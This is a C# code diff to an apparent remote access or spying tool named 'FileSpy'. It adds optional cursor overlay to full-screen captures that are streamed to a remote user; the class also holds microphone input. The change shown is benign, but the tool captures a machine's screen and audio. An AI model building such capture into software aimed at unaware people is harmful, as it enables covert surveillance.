@@ -5,6 +5,7 @@ using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
 using System.IO;
 using System.IO.Compression;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -24,6 +25,7 @@ namespace FileSpy.Classes
         public int MaxFps { get; set; }
         public long Quality { get; set; }
         public int Size { get; set; }
+        public bool Cursor { get; set; }
 
         public WaveInEvent MicroInput { get; set; }
         public bool AudioStream { get; set; }
@@ -44,6 +46,7 @@ namespace FileSpy.Classes
             MaxFps = 10;
             Quality = 50L;
             Size = 1;
+            Cursor = false;
 
             MicroInput = new WaveInEvent();
             MicroInput.WaveFormat = new WaveFormat(8000, 16, 1);
@@ -75,7 +78,7 @@ namespace FileSpy.Classes
                 {
                     LastFPS = DateTime.Now;
 
-                    Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality)));
+                    Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality, Cursor)));
 
                     while ((DateTime.Now - LastFPS).TotalMilliseconds < 1000 / MaxFps)
                         Thread.Sleep(1);
@@ -122,7 +125,31 @@ namespace FileSpy.Classes
             return bump;
         }
 
-        public static byte[] TakeImageFrom(int size, long quality)
+        [StructLayout(LayoutKind.Sequential)]
+        struct CURSORINFO
+        {
+            public Int32 cbSize;
+            public Int32 flags;
+            public IntPtr hCursor;
+            public POINTAPI ptScreenPos;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct POINTAPI
+        {
+            public int x;
+            public int y;
+        }
+
+        [DllImport("user32.dll")]
+        static extern bool GetCursorInfo(out CURSORINFO pci);
+
+        [DllImport("user32.dll")]
+        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
+
+        const Int32 CURSOR_SHOWING = 0x00000001;
+
+        public static byte[] TakeImageFrom(int size, long quality, bool cursor)
         {
             using (var ms = new MemoryStream())
             {
@@ -131,6 +158,21 @@ namespace FileSpy.Classes
                     using (var graphics = Graphics.FromImage(bitmap))
                     {
                         graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+
+                        if (cursor)
+                        {
+                            CURSORINFO pci;
+                            pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));
+
+                            if (GetCursorInfo(out pci))
+                            {
+                                if (pci.flags == CURSOR_SHOWING)
+                                {
+                                    DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
+                                    graphics.ReleaseHdc();
+                                }
+                            }
+                        }
 
                         ImageCodecInfo jgpEncoder = GetEncoder(ImageFormat.Jpeg);
 
